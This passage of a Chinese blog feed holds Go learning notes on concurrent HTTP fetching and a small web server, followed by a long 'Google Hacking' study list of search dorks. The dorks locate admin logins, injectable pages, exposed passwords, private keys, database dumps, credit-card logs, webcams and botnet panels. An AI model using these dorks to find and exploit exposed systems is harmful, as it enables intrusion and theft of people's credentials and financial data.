ch)<br>&#125;<br><span class="hljs-keyword">for</span> <span class="hljs-keyword">range</span> os.Args[<span class="hljs-number">1</span>:] &#123;<br>fmt.Println(&lt;-ch)<br>&#125;<br>fmt.Printf(<span class="hljs-string">&quot;%.2fs elapsed\n&quot;</span>, time.Since(start).Seconds())<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">fetch</span><span class="hljs-params">(url <span class="hljs-type">string</span>, ch <span class="hljs-keyword">chan</span>&lt;- <span class="hljs-type">string</span>)</span></span> &#123;<br>start := time.Now()<br>resp, err := http.Get(url)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>ch &lt;- fmt.Sprint(err)<br><span class="hljs-keyword">return</span><br>&#125;<br>nbytes, err := io.Copy(ioutil.Discard, resp.Body)<br>resp.Body.Close()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>ch &lt;- fmt.Sprintf(<span class="hljs-string">&quot;while reading %s: %v&quot;</span>, url, err)<br><span class="hljs-keyword">return</span><br>&#125;<br>secs := time.Since(start).Seconds()<br>ch &lt;- fmt.Sprintf(<span class="hljs-string">&quot;%.2fs %7d %s&quot;</span>, secs, nbytes, url)<br>&#125;<br></code></pre></td></tr></table></figure><p>在<code>terminal</code>里执行：<code>go run hello.go https://www.baidu.com http://gopl.io https://remixxyh.github.io</code></p><p>将会得到：</p><p><img src="/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/Snipaste_2023-08-31_15-53-48.png"></p><p>我们可以发现整个程序执行的时间由获取请求最长的那个决定</p><p>这是一个并发请求的程序，分析上面的代码：</p><ul><li><code>ch := make(chan string)</code>是一个用于在<code>Goroutine</code>之间传递数据的管道，每当<code>fetch</code>函数执行完毕后，它会将一个带有消息的字符串发送到通道中</li><li><code>Goroutine</code>是一种函数的并发执行方式，<code>main</code>函数本身也运行在一个<code>goroutine</code>中，而<code>go function</code>则表示创建一个新的goroutine，并在这个新的goroutine中执行这个函数</li><li>这个程序里会异步执行<code>Get</code>方法，将<code>Body</code>拷贝到<code>ioutil.Discard</code>（可以把这个变量看成一个垃圾桶）输出流中，<code>io.Copy</code>函数会返回两个值(复制的字节数和可能的错误)，从而实现不处理<code>Body</code>，得到响应体的字节数</li><li><strong>在使用通道发送或者接收数据时，如果此时通道已满或者主函数<code>main</code>没有做好接收的准备（注意：<code>main</code>函数也是一个<code>Goroutine</code>），那么会在发送数据的<code>Goroutine</code>那里阻塞，这个例子中就是<code>fetch</code>函数；如果通道为空或者没有数据可以使用，那么会在接收数据的<code>Goroutine</code>那里阻塞。所以这个例子在<code>main</code>使用一个<code>for</code>循环接收数据，是为了防止主函数执行完了但是<code>fetch</code>还没有执行完</strong>。</li></ul><h4 id="Web服务"><a href="#Web服务" class="headerlink" title="Web服务"></a>Web服务</h4><p>Go语言的内置库使得写一个类似fetch的web服务器变得异常地简单。在本节中，我们会展示 一个微型服务器，这个服务器的功能是返回当前用户正在访问的URL。比如用户访问的是 <a href="http://localhost:8000/hello">http://localhost:8000/hello</a> ，那么响应是URL.Path &#x3D; “hello”。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>http.HandleFunc(<span class="hljs-string">&quot;/&quot;</span>, handler)<br>log.Fatal(http.ListenAndServe(<span class="hljs-string">&quot;localhost:8000&quot;</span>, <span class="hljs-literal">nil</span>))<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">handler</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;<br>fmt.Fprintf(w, <span class="hljs-string">&quot;URL.Path = %q\n&quot;</span>, r.URL.Path)<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/Snipaste_2023-09-01_14-09-52.png"></p><p>在浏览器里访问：</p><p><img src="/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/Snipaste_2023-09-01_14-08-41.png"></p><p>多个控制器：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> mu sync.Mutex<br><span class="hljs-keyword">var</span> count <span class="hljs-type">int</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>http.HandleFunc(<span class="hljs-string">&quot;/&quot;</span>, handler)<br>http.HandleFunc(<span class="hljs-string">&quot;/count&quot;</span>, counter)<br>log.Fatal(http.ListenAndServe(<span class="hljs-string">&quot;localhost:8000&quot;</span>, <span class="hljs-literal">nil</span>))<br>&#125;<br><br><span class="hljs-comment">// handler echoes the Path component of the requested URL.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">handler</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;<br>mu.Lock()<br>count++<br>mu.Unlock()<br>fmt.Fprintf(w, <span class="hljs-string">&quot;URL.Path = %q\n&quot;</span>, r.URL.Path)<br>&#125;<br><br><span class="hljs-comment">// counter echoes the number of calls so far.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">counter</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;<br>mu.Lock()<br>fmt.Fprintf(w, <span class="hljs-string">&quot;Count %d\n&quot;</span>, count)<br>mu.Unlock()<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/Snipaste_2023-09-01_14-15-13.png"></p><p>​在这些代码的背后，服务器每一 次接收请求处理时都会另起一个<code>goroutine</code>，这样服务器就可以同一时间处理多个请求。在并发情况下，两个请求同一时刻去更新<code>count</code>，那么这个值可能并不会被正确地 增加；这个程序可能会引发一个严重的<code>bug</code>：竞态条件。</p><p>​<strong>为了避免这个问题，我们必须保证每次修改变量的最多只能有一个<code>goroutine</code>，这也就是代码里的<code>mu.Lock()</code>和 <code>mu.Unlock()</code>调用将修改<code>count</code>的所有行为包在中间的目的。</strong></p><p>第一章的学习就到这里啦，入门了GO👍👍👍</p>]]></content>
    
    
    <categories>
      
      <category>读书笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>读书笔记</tag>
      
      <tag>Golang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Google_Hacking学习</title>
    <link href="/2023/08/14/Google-Hacking%E5%AD%A6%E4%B9%A0/"/>
    <url>/2023/08/14/Google-Hacking%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p> 要学会使用Google-Hacking哦！</p><span id="more"></span><h3 id="Google搜索语法"><a href="#Google搜索语法" class="headerlink" title="Google搜索语法"></a>Google搜索语法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ABAP">intitle: 搜索网页标题中包含有特定字符的网页。例如输入“intitle: cbi”，这样网页标题中带有cbi的网页都会被搜索出来。<br><br>inurl: 搜索包含有特定字符的URL。例如输入“inurl:cbi”，则可以找到带有cbi字符的URL。<br><br>intext: 搜索网页正文内容中的指定字符，例如输入“intext:cbi”。这个语法类似我们平时在某些网站中使用的“文章内容搜索”功能。Filetype:搜索指定类型的文件。例如输入“filetype:cbi”，将返回所有以cbi结尾的文件URL。<br><br>Site: 找到与指定网站有联系的URL。例如输入“Site:family.chinaok.com”。所有和这个网站有联系的URL都会被显示。这些就是Google的常用语法，也是Google Hack的必用语法。虽然这只是Google语法中很小的部分，但是合理使用这些语法将产生意想不到的效果。<br></code></pre></td></tr></table></figure><h3 id="GoogleHacking"><a href="#GoogleHacking" class="headerlink" title="GoogleHacking"></a>GoogleHacking</h3><h4 id="寻找登陆页面"><a href="#寻找登陆页面" class="headerlink" title="寻找登陆页面"></a>寻找登陆页面</h4><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">inurl:</span>Login <br><span class="hljs-symbol"></span><br><span class="hljs-symbol">intitle:</span>后台登录管理员 <br><span class="hljs-symbol"></span><br><span class="hljs-symbol">intext:</span>后台登录 <br><span class="hljs-symbol"></span><br><span class="hljs-symbol">inurl:</span><span class="hljs-keyword">/admin/</span>login.php <br><span class="hljs-symbol"></span><br><span class="hljs-symbol">inurl:</span><span class="hljs-keyword">/phpmyadmin/</span>index.php 将返回含有phpmyadmin后台的网页<br><br>组合拳：<br><span class="hljs-symbol">intext:</span>后台登录  inurl:login.php<br><span class="hljs-symbol">intext:</span>后台登录  inurl:login.php -canvas<br></code></pre></td></tr></table></figure><h4 id="eduSRC"><a href="#eduSRC" class="headerlink" title="eduSRC"></a>eduSRC</h4><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim">intext:职业学院 inur<span class="hljs-variable">l:edu</span>.<span class="hljs-keyword">cn</span><br>intext:职业学院管理后台 inur<span class="hljs-variable">l:edu</span>.<span class="hljs-keyword">cn</span><br>intext:管理后台 inur<span class="hljs-variable">l:edu</span>.<span class="hljs-keyword">cn</span><br>intext:中学 inur<span class="hljs-variable">l:login</span>.php<br>intext:中学 +后台管理 inur<span class="hljs-variable">l:login</span><br></code></pre></td></tr></table></figure><h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">site:http://baidu.<span class="hljs-keyword">com</span> <span class="hljs-keyword">filetype</span>:pdf 将只返回http://baidu.<span class="hljs-keyword">com</span>站点上文件类型为pdf的网页<br></code></pre></td></tr></table></figure><p>link:<a href="https://link.zhihu.com/?target=http://www.baidu.com">http://www.baidu.com</a> 将返回所有包含指向<a href="https://link.zhihu.com/?target=http://www.baidu.com">http://www.baidu.com</a>的网页</p><p>related:<a href="https://link.zhihu.com/?target=http://www.llhc.edu.cn">http://www.llhc.edu.cn</a> 将返回与<a href="https://link.zhihu.com/?target=http://www.llhc.edu.cn">http://www.llhc.edu.cn</a>相似的页面，相似指的是网页的布局相似</p><p>index of &#x2F;admin 发现允许目录浏览的web网站</p><p>inurl:share.cgi?ssid&#x3D; 云服务器文件和文件夹共享</p><p>intitle:”Welcome to QNAP Turbo NAS” QNAP登录页面</p><p>inurl:”img&#x2F;main.cgi?next_file” 在线摄像头</p><p>ext:log inurl:”&#x2F;pgadmin” 包含多媒体信息的文件,pgAdmin客户端日志文件</p><p>“<a href="https://link.zhihu.com/?target=http://m.zippyshare.com/">http://m.zippyshare.com/</a>“ 敏感目录</p><p>“– Account dump” ext:sql-git 使用标签查找关于MySQL转储的信息</p><p>inurl:_vti_pvt&#x2F;administrators.pwd 用于检索MS FrontPage共享点的敏感信息登录&#x2F;密码</p><p>inurl:front&#x2F;central.php 包含登录门户的页面</p><p>inurl:zabbix.php AND intext:”Zabbix SIA” zxbbix网络监控系统</p><p>inurl:”&#x2F;wp-admin&#x2F;setup-config.php” intitle:”Setup Configuration File” 找未完成的安装Wordpress</p><p>inurl:scgi-bin intitle:”NETGEAR ProSafe” 千兆防火墙。默认用户名：admin。默认密码：密码inurl：scgi-bin</p><p>inurl:index of&#x3D; %2F &#x2F;admin login %2F intitle:”Administration Login - 网络托管公司的管理员登录</p><p>intitle:”twonky server” inurl:”9000” -intext:”9000” 查找Twonky媒体共享服务器</p><p>inurl:”sitemanager.xml” ext:xml -git 查找FileZilla站点管理器文件，其中包含FTP用户名和密码Dxtroyer</p><p>intitle:”Sign in · GitLab” 查找GitLab登录页面</p><p>inurl:”&#x2F;api&#x2F;index.php” intitle:UniFi 查找具有多信息的UniFi API浏览器，如WiFi密码redstoner2014</p><p>inurl:”wp-content&#x2F;uploads&#x2F;file-manager&#x2F;log.txt” WordPress插件文件管理器日志文件有趣的信息</p><p>“TX_start” “card_name” ext:log 从商店查找交易记录，其中包含多汁的信用卡&#x2F;借记卡信息</p><p>intitle:”Namenode information” AND inurl:”:50070&#x2F;dfshealth.html” 用于基础设施Hadoop的NameNode存储信息</p><p>inurl:&#x2F;_layouts&#x2F;mobile&#x2F;view.aspx?List&#x3D; 包含用户名的文件</p><p>inurl:”.php?id&#x3D;” “You have an error in your SQL syntax” 找到sql注入的网站</p><p>inurl:&#x2F;proc&#x2F;self&#x2F;cwd 遭到入侵的易受攻击的Web服务器</p><p>inurl:&#x2F;remote&#x2F;login?lang&#x3D;en 查找FortiGate防火墙的SSL-VPN登录门户</p><p>intitle:”Plesk Onyx” intext:”Interface language” 查找Plesk Onyx登录页面</p><p>intitle:”GitBucket” intext:”Recent updated repositories” intext:”Sign In” 查找GitBucket服务器</p><p>intitle:”cuckoo sandbox” “failed_reporting” cuckoo 失败报考</p><p>“You‘re successfully running JSON Server” 成功运行JSON服务器</p><p>index of &#x2F;htdocs 用于查找未经授权的Web服务器，并通过‘htdocs‘文件夹查找所有敏感信息</p><p>inurl:login.cgi intitle:NETGEAR NETGEAR 在线查找GSS108E ProSAFE PoE +点击开关,默认密码password</p><p>inurl:”&#x2F;ap&#x2F;recuperadocumentossql.aspx” AuraPortal：内部文件</p><p>intitle:”Namenode information” 查找无密封的文件系统，等待被利用</p><p>inurl:”&#x2F;ADVANCED&#x2F;COMMON&#x2F;TOP” 查找无密码的爱普生打印机</p><p>filetype:ini “wordfence”. 找到运行Wordfence WAF的WordPress网站</p><p>intitle:”Index of” “Apache&#x2F;2.4.7 (Ubuntu) Server” 用于查找Ubuntu服务器和某个版本的Apache</p><p>“Sorting Logs:” “Please enter your password” “Powered By” -urlscan -alamy 找到stealer僵尸网络控制面板</p><p>intitle:”Index of &#x2F;“ “mod_ssl 2.2.22 OpenSSL&#x2F;1.0.1” 找到易受攻击的Bug Dxtroyer的OpenSSL服务器</p><p>intitle:”Index of &#x2F;“ “Proudly Served by Surftown at” 查找Surftown HTTP服务器Dxtroyer</p><p>“Blocking Reason:” ext:log -git 找到安全漏洞日志Dxtroyer</p><p>inurl:”&#x2F;logs&#x2F;www” ext:log 查找连接日志，用户代理，错误等</p><p>intitle:”Index of &#x2F;“ “joomla_update.php” 找到具有Joomla日志的目录，通常包含多汁的信息</p><p>intext:uploadOverwrite || intext:OPEN || intext:cwd cwd作者</p><p>intext:DB_PASSWORD || intext:”MySQL hostname” ext:txt 允许你搜索WordPress配置</p><p>site:<a href="https://link.zhihu.com/?target=http://pastebin.com">http://pastebin.com</a> intext:”<em>@</em>.com:*” 查找<a href="https://link.zhihu.com/?target=http://pastebin.com">http://pastebin.com</a>转储的邮件列表，密码TPNight</p><p>inurl:”g2_view&#x3D;webdav.WebDavMount” 查找启用WebDAV的网站TPNight</p><p>-inurl:htm -inurl:html intitle:”index of” NIKON 浏览尼康数码单反相机和相机目录中上传和保存的图像和照片</p><p>-inurl:htm -inurl:html intitle:”index of” 100CANON 浏览佳能的目录中上传和保存的图像和照片</p><p>“Protocol&#x3D;unreal” ext:ini -git 到虚幻游戏文件，可能包含管理员密码</p><p>inurl:”&#x2F;Windows&#x2F;Cookies&#x2F;“ext:txt -telecom -forbidden -git查找Windows存储的Cookie，可能包含加密的用户名和密码</p><p>“[FFFTP]” ext:ini 使用FTP登录，服务器信息等查找文件</p><p>“random‘s system information tool” ext:txt 从系统信息工具找信息</p><p>inurl:app&#x2F;config&#x2F;intext:parameters.yml intitle:index.of 目录：Symfony（PHP Framework）包含</p><p>inurl:”dcwp_twitter.php?1&#x3D;” 使用私人消息，加密凭证等查找Twitter API日志</p><p>intitle:”Setup Home” “Internet Status” -belkin 找到互联网连接的Arris路由器</p><p>inurl:”<a href="ftp://www/">ftp://www</a>.” “Index of &#x2F;“ 查找在线FTP服务器</p><p>intitle:”CGIWrap Error” 查找包含一些有趣信息的CGIWrap脚本错误</p><p>“Consola de Joomla! Debug” inurl:index.php 提供以下信息&gt;会话&gt;配置文件信息&gt;内存使用&gt;数据库注册表</p><p>inurl:”pubdlcnt.php?file&#x3D;” ext:php 找到重定向漏洞.</p><p>“– MySQL Administrator dump” ext:sql 找到一些不错的数据库转储，可能包含用户名，密码和其他</p><p>“—–BEGIN X509 CERTIFICATE—–” ext:pem -git 查找X.509服务器证书</p><p>“START securepay” ext:log 查找交易记录（有时包含信用卡号码和其他多汁的信息</p><p>inurl:”8080&#x2F;jmx-console” 将列出所有未经身份验证的jboss服务器与jmx-console访问</p><p>inurl:”Login;jsessionid&#x3D;” 查找通用的JS登录门户</p><p>inurl:”idx_config” 找到通过shell抓取配置</p><p>inurl:”exit.php?url&#x3D;” -entry_id 页面易受任意重定向</p><p>“KVP_ENCDATA:Version&#x3D;1.0” ext:log 查找具有银行帐户信息的交易记录</p><p>allinurl:”&#x2F;wp-content&#x2F;plugins&#x2F;wp-noexternallinks” 找到易受XSS影响的“无外部链接”插件“”错误</p><p>“resources.db.params.password” ext:ini -git 找数据库用户名和密码</p><p>intitle:”Dell SonicWALL - Authentication” 发现戴尔防火墙服务器</p><p>intitle:”webcamXP 5” -download 查找WebcamXP相机</p><p>inurl:”<a href="https://link.zhihu.com/?target=http://ftp.dlink">http://ftp.dlink</a>“ 允许我们找到D-Link路由器的FTP目录列表</p><p>intitle:”Authorization” “TF” inurl:”admin.php” 找到一堆未受保护的僵尸网络控制面板</p><p>inurl:”<a href="https://link.zhihu.com/?target=http://webmail">http://webmail</a>.” 查找各种网络邮件服务器</p><p>inurl:”&#x2F;siteadmin&#x2F;index.php” 找到管理控制台</p><p>ext:reg”[HKEY_CURRENT_USER\Software\ORL\WinVNC3]” -git 使用WinVNC密码查找文件</p><p>“mysqli_connect” ext:inc 查找包含MySQL用户名和密码的脚本</p><p>“MiniToolBox by Farbar” ext:txt 查找具有IP配置，DNS信息，应用程序错误等的日志！</p><p>“WEB Browser Password Recovery” ext:txt WEB浏览器密码重置</p><p>“Operating System Intel Recovery” ext:txt 操作系统英特尔恢复</p><p>“iSpy Keylogger” “Passwords Log” ext:txt iSpy Keylogger日志密码</p><p>ext:php intext:”-rwxr-xr-x” site:.in 受影响的软件</p><p>inurl:<a href="https://link.zhihu.com/?target=http://core.windows.net">http://core.windows.net</a> ext:xlsx 可以更改文件扩展名或运行没有扩展名</p><p>“– MySQL dump” ext:sql -git 查找MySQL数据库转储，用户名，密码</p><p>inurl:&#x2F;helpdesk&#x2F;staff&#x2F;index.php? 找到“Kayako软件票务门户登录页面”</p><p>inurl:&#x2F;_catalogs 识别sharepoint服务器</p><p>inurl:&#x2F;pub&#x2F; inurl:<em>ri</em> 使用Oracle Responsys的服务器*</p><p>inurl:”&#x2F;data&#x2F;urllist.txt” ext:txt -git 文网站地图，其中包含robots.txt</p><p>“Log in” “Magento is a trademark of Magento Inc.” 查找Magento管理登录</p><p>intitle:index of intext:@WanaDecryptor@.exe Wannacry Ransonware感染的服务器</p><p>“ End Stealer “ ext:txt 333从“Black Stealer” 中查找日志，这是一个互联网密码</p><p>“— WebView Livescope Http Server Error —“ -git WebView服务器错误，主要发现在旧服务器</p><p>intitle:index of intext:wncry 找到受Wannacry Ransomware影响的服务器</p><p>inurl:”&#x2F;view&#x2F;view.shtml?id&#x3D;” 查找Axis IP摄像机</p><p>intitle:”Welcome to ZyXEL” <a href="https://link.zhihu.com/?target=http://-zyxel.com">http://-zyxel.com</a> 查找ZyXEL路由器，IP摄像机和其他设备</p><p>“FileZilla” inurl:”recentservers.xml” -git 查找FileZilla最新的服务器文件，带有纯文本用户名&#x2F;密码</p><p>“SECRET&#x2F;&#x2F;NOFORN” ext:pdf 找到秘密政府文件</p><p>“PHP Fatal error: require()” ext:log 找到PHP错误日志</p><p>inurl:”go.cgi?url&#x3D;” 找到可以利用来重定向 可以将其用于网络钓鱼</p><p>(site:onion.link | site:onion.cab | site:<a href="https://link.zhihu.com/?target=http://tor2web.org">http://tor2web.org</a> | site:onion.sh | site:tor2web.fi | site:onion.direct) 查找托管在Tor网络托管的网站</p><p>inurl:”<a href="https://link.zhihu.com/?target=http://voicemail">http://voicemail</a>.” 各种语音邮件服务器</p><p>“Stealer by W33DY” ext:txt 找到具有用户名，密码和网站</p><p>inurl:”this.LCDispatcher?nav&#x3D;” 查找连接到互联网Dxtroyer的HP打印机</p><p>inurl:”multimon.cgi” intitle:”UPS” 找到现场交通显示器</p><p>inurl:”member.php?action&#x3D;login” 查找由MyBB 登录页面</p><p>“Section” inurl:”xorg.conf” ext:conf -wiki Xorg X的配置文件，包含受害者的计算机信息</p><p>inurl:”lvappl.htm” 找到连接到互联网服务器（主要是安全摄像头</p><p>intitle:index of AND (intext:mirai.x86 OR intext:mirai.mips OR intext:mirai.mpsl OR</p><p>intext:mirai.arm OR intext:mirai.arm7 OR intext:mirai.ppc OR intext:mirai.spc OR intext:mirai.m68k OR intext:mirai.sh4) 查找感染服务器</p><p>inurl:”&#x2F;zebra.conf” ext:conf -git 查找GNU Zebra登录凭据</p><p>“screen mode id:” ext:rdp RDP基本上是Windows认证的后门</p><p>inurl:”&#x2F;Windows&#x2F;Cookies&#x2F;“ ext:txt -git 所有种类的网站的Cookie</p><p>inurl:”&#x2F;drive&#x2F;folders&#x2F;“ site:<a href="https://link.zhihu.com/?target=http://drive.google.com">http://drive.google.com</a> Google云端硬盘文件夹</p><p>inurl:”&#x2F;fmi&#x2F;webd” 登录另一个文件云文件夹</p><p>“HTTP” inurl:”access.log” ext:log 查找包含有关网站活动信息的日志</p><p>inurl:”folderview?id&#x3D;” site:<a href="https://link.zhihu.com/?target=http://drive.google.com">http://drive.google.com</a> 查找人员的私人文件夹</p><p>“Index of” inurl:”&#x2F;$Recycle.Bin&#x2F;“ Windows回收箱</p><p>inurl:”<a href="https://link.zhihu.com/?target=http://Makefile.in">http://Makefile.in</a>“ ext:in 使用私有服务器信息查找配置文件</p><p>inurl:&#x2F;j_security_check;jsessionid&#x3D; 可以访问很多登录页面</p><p>intext:VIEWS · Server: - Database: information_schema - Table: SCHEMA_PRIVILEGES · Browse · Structure · SQL · Search · Export 访问网站phpmyadmin的web服务器</p><p>“[dirs]” inurl:”mirc.ini” -git 查找mIRC配置文件</p><p>ext:fetchmailrc 查找.fetchmailrc文件与电子邮件登录信息</p><p>“[main]” “enc_GroupPwd&#x3D;” ext:txt 找到Cisco VPN客户端密码</p><p>“InnoDB:” ext:log 找到MySQL错误日志</p><p>“—–BEGIN RSA PRIVATE KEY—–” ext:key　　＃＃＃ 一些哈希（密码，证书等</p><p>“Scan result of Farbar Recovery Scan Tool” ext:txt 　　　　Farbar恢复扫描工具扫描结果</p><p>“ AdwCleaner” ext:txt 　　　　　　　　　　　　　　　 查找AdwCleaner logfiles</p><p>“&#x2F;wp-admin&#x2F;admin-ajax” ext:txt 查找robots.txt文件，其中提供有关服务器更敏感方面的信息</p><p>“WHMCS Auto Xploiter” 发现WHMCS在站点Dxtroyer中利用shellz</p><p>powered by h5ai 由h5ai提供*您可以浏览文件</p><p>“[PHPSESSID]” ext:log 查找由PHP Dxtroyer生成的会话ID的日志</p><p>“Access Denied” “Powered by Incapsula” ext:php 查找触发了Incapsula WAF Dxtroyer的易受攻击的页面</p><p>“authentication failure; logname&#x3D;” ext:log 查找失败登录的日志文件，其中包含用户名和登录路径</p><p>filetype:bak inurl:php “mysql_connect” 包含MySQL数据库密码的PHP备份</p><p>inurl:”&#x2F;load.cgi” ext:cgi 查找更多页面易受重定向的</p><p>“Logfile of Trend Micro HijackThis” ext:log 趋势微劫持的日志文件</p><p>“LGD_CARDNUM” ext:log -site:<a href="https://link.zhihu.com/?target=http://camper.com">http://camper.com</a> 查找部分信用卡号，银行帐户信息</p><p>inurl:”&#x2F;HtmlAdaptor?action&#x3D;”</p><p>“[boot loader]” “WINNT” ext:ini 查找boot.ini文件，显示在服务器</p><p>inurl:”mail” ext:mai 发送的私人电子邮件</p><p>“%@” ext:ascx 查找ASP配置和设置</p><p>intitle:”Nessus Scan Report” ext:html 查找Nessus（漏洞扫描程序</p><p>“SERVER_ADDR” “SERVER_PORT” “SERVER_NAME” ext:log 查找具有服务器信息的日志</p><p>inurl:”exit.php?site&#x3D;” 查找允许您将用户重定向到任何网站的文件</p><p>inurl:”&#x2F;SecureAuth1” SecureAuth登录，密码重置i</p><p>inurl:”&#x2F;admin.php?cont&#x3D;” 找到Radius Manager登录页面</p><p>“ -FrontPage-“ ext:pwd 查找MS Frontpage密码</p><p>inurl:”&#x2F;sitemap.xsd” ext:xsd 找到导致站点地图的文件…有用于查找登录门户和内容</p><p>inurl:”&#x2F;fb_ca_chain_bundle.crt” ext:crt 查找Facebook留下的安全证书，可能有一些有用的信息</p><p>“El Moujahidin Bypass Shell” ext:php 简单上传</p><p>“ This file was generated by libcurl! Edit at your own risk.” ext:txt cookie数据，有时包含易受攻击的信息</p><p>“END_FILE” inurl:”&#x2F;password.log” 查找用户特定的登录信息</p><p>-english -help -printing -companies -archive -wizard -pastebin -adult -keywords “Warning: this page requires Javascript. To correctly view, please enable it in your browser” 用于fortinet防火墙登录网络的</p><p>“INSERT INTO phpbb_users” ext:sql 查找具有用户名和散列密码的文件</p><p>“havij report” “Target” ext:html 显示havij sqli注射报告</p><p>inurl:”&#x2F;admin&#x2F;index.php?msg&#x3D;” inurl:”%20” 找到可以XSS‘d和编辑的页面</p><p>intitle:”Priv8 Mailer Inbox 2015” ext:php 只是另一个邮件：P请不要使用垃圾邮件</p><p>inurl:”-wp13.txt” 找到MySQL，ABSPATH，Wordpress等配置文件</p><p>intext:Table structure for table <code>wp_users</code> filetype:sql 网站数据库转储信息</p><p>“Joomla! Administration Login” inurl:”&#x2F;index.php” 查找Joomla管理员登录页面</p><p>“Index of” “logins.json” “key3.db” 查找包含保存的Firefox密码，浏览历史记录等</p><p>“Greenstone receptionist” inurl:”&#x2F;etc&#x2F;main.cfg” 查找Web应用程序配置</p><p>“PGP SIGNED MESSAGE—–” inurl:”md5sums” FINDs（MD5，SHA1等</p><p>inurl:”&#x2F;phpinfo.php” “PHP Version” 找到phpinfo（）页面</p><p>inurl:”.php?cat&#x3D;” inurl:”‘“ 查找易受SQL注入攻击的站点</p><p>“Fatal NI connect error” “, connecting to:” ext:log 找到不同应用程序日志的全部负载</p><p>inurl:”&#x2F;attachment&#x2F;“ ext:log 查找具有LOTS信息的Web应用程序日志</p><p>“Below is a rendering of the page up to the first error.” ext:xml 错误信息</p><p>inurl:”&#x2F;irclogs&#x2F;“ ext:log 找到IRC日志</p><p>( ext:php ) ( inurl:&#x2F;wp-content&#x2F;uploads&#x2F;AAPL&#x2F;loaders&#x2F; ) 找到网络shell</p><p>filetype:pcmcfg 搜索pulseway应用程序</p><p>inurl:cgi-bin&#x2F;lsnodes_web?node 在线无线电状态节点</p><p>inurl:&#x2F;profile.php?lookup&#x3D;1 网站和论坛的管理员名称</p><p>“your default password is” filetype:pdf 初始密码</p><p>inurl:”.Admin;-aspx }” “~Login” 管理员登录-Xploit</p><p>inurl:?filesrc&#x3D;**** ~”Current” ~”asp” 不同的上传的shell名称</p><p>ext:svc inurl:wsdl Web服务描述语言</p><p>inurl:”.reset;-.pwd }” “~ User” 门户登录存储用户信息</p><p>“CF-Host-Origin-IP” “CF-Int-Brand-ID” “CF-RAY” “CF-Visitor” “github” -site:<a href="https://link.zhihu.com/?target=http://github.com">http://github.com</a> -site:<a href="https://link.zhihu.com/?target=http://cloudfare.com">http://cloudfare.com</a> <a href="https://link.zhihu.com/?target=http://cloudfare.com">http://cloudfare.com</a>替换“<a href="https://link.zhihu.com/?target=http://github.com">http://github.com</a></p><p>httrack inurl:hts-log.txt ext:txt <a href="https://link.zhihu.com/?target=http://-github.com">http://-github.com</a> httrack网站复制日志的数据</p><p>inurl:sendmessage.php?type&#x3D;skype 反映XSS易受攻击的</p><p>site:<a href="https://link.zhihu.com/?target=http://onedrive.live.com">http://onedrive.live.com</a> shared by 识别共享存档</p><p>intitle:”Login - OpenStack Dashboard” inurl:”dashboard” 登录 - OpenStack仪表板登录</p><p>inurl:”&#x2F;graphs” intext:”Traffic and system resource graphing” 查看mikrotik图形界面inurl的结果</p><p>intitle:”FormAssembly Enterprise :” 包含表单组织用于收集信息。有些敏感</p><p>inurl:forgot.do;jsessionid&#x3D; 忘记密码门户</p><p>site:<a 